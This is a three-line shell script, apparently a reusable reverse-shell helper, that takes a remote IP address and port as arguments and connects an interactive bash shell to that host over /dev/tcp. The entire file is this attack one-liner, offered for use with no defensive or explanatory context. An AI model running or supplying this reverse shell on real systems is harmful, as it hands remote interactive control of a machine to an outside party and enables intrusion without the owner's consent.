# $1 remote ip address
# $2 remote port 
/bin/bash -i >& /dev/tcp/$1/$2 0<&1 1<&0 2<&0
